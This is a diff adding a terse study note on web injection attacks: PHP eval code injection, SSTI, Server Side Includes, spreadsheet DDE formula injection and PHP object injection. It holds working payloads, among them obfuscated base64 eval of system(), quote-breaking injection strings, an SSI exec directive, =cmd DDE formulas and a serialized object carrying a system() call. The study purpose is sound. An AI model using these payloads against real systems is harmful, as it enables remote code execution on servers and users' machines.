@@ -1,0 +1,77 @@
+PHP Code Injection :
+	eval
+	call function dynamic
+
+	php comment:
+			#
+			//
+			/* */
+
+	eval -> string -> execute php code
+
+	systsystemem('ls -la')
+
+	system('ls -la');-> base64
+
+	c3lzdGVtKCdscyAtbGEnKTs=
+	eval(base64_decode('c3lzdGVtKCdscyAtbGEnKTs='));
+
+	salam'.phpinfo();//
+	ali'.system('ls -la');//
+
+	$a = "ali";
+	$b = "reza";
+	$c = $a . $b;
+	print $c;//alireza
+	
+
+	Server Side Template Injection (SSTI)
+		
+		MVC 
+			contact
+				contact.tpl ->  ui  ->  {$a} -> 
+				contact.php -> controller ->   $a = "ali"
+				contact.model.php  ->  db
+
+		      smarty 
+					
+			
+
+	Server Side Includes -> Injection  apache
+
+			.shtml
+
+			<!--#echo var="DATE_LOCAL" --> 
+
+			<!--#exec cmd="ls -la" -->
+
+		
+	=cmd|' /C calc'!A0
+	=cmd|' /C notepad'!A0
+	
+
+	PHP Object Injection
+		
+		serialize -> object -> string
+		unserialize -> string -> object
+
+
+
+		class Test
+		{
+			public $code;
+		}	
+		
+		$x = new Test();
+		$x->code = "system('ls -la')";
+		print serialize($x);
+
+		O:4:"Test":1:{s:4:"code";s:17:"system('ls -la');";}
+
+
+
+
+
+		
+
+
